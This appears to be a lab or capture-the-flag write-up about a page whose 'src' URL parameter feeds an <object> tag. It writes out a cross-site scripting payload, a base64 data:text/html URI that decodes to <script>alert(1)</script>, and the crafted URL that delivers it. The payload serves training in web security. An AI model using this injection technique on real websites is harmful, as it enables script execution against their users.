On the home page there is only one image that is a link, the picture of the nsa.
It leads us to this page :
http://192.168.56.102/?page=media&src=nsa

Inspecting the page we see that the image is displayed not by a <img> but by a <object> tag :
<object data="http://192.168.56.102/images/nsa_prism.jpg"></object

we want to change the data displayed by object. the src of the data in chosen by what is put in the src field of the url
in order to obtain this tag : <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== -> <script>alert(1)</script>

we craft this url
http://192.168.56.102/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
